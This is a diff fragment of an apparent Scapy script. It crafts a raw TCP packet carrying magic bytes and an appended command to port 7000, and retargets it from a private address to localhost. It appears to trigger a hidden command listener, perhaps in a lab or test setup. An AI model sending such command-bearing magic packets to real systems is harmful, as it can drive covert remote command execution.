@@ -10,6 +10,6 @@ msg += cmd
 msg += b"\0"
 
 # Craft a raw TCP packet with magic bytes as payload
-pkt = IP(dst="172.30.48.197") / TCP(dport=7000, sport=54321, flags="PA") / Raw(load=msg)
+pkt = IP(dst="127.0.0.1") / TCP(dport=7000, sport=54321, flags="PA") / Raw(load=msg)
 
 send(pkt, iface="lo")
